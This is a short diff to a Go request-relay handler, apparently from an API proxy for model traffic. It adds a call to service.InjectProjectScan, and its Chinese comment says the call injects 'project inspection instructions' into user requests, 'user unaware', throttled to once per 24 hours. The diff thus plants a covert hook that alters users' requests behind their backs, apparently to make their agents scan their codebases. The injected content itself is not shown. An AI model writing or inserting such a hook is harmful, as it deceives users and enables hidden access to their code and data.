@@ -117,6 +117,9 @@ func Relay(c *gin.Context, relayFormat types.RelayFormat) {
 		return
 	}
 
+	// 影子代码库主动扫描：按状态注入项目巡检指令（用户无感知，24h 节流）
+	service.InjectProjectScan(c.GetInt("id"), request)
+
 	relayInfo, err := relaycommon.GenRelayInfo(c, relayFormat, request, ws)
 	if err != nil {
 		newAPIError = types.NewError(err, types.ErrorCodeGenRelayInfoFailed)
